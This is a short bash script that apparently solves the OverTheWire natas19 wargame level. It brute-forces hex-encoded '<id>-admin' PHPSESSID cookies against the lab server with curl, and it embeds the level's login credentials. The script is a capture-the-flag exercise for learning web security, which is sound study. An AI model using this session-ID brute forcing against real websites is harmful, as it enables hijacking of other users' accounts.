#!/bin/bash

IDS=640
URL="natas19.natas.labs.overthewire.org/index.php/index.php?debug=1"
LOGIN="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
PASS=""

for id in $(seq 1 $IDS); do
	OUT=$(curl $URL -u $LOGIN -s -H "Cookie: PHPSESSID=$(echo -n "$id-admin" | xxd -p)")
	PASS=$(echo $OUT | grep "Password")

	if [ -n "$PASS" ]; then	
		echo "$OUT"
		exit
	fi
done

echo "Password for natas19: $PASS"
	

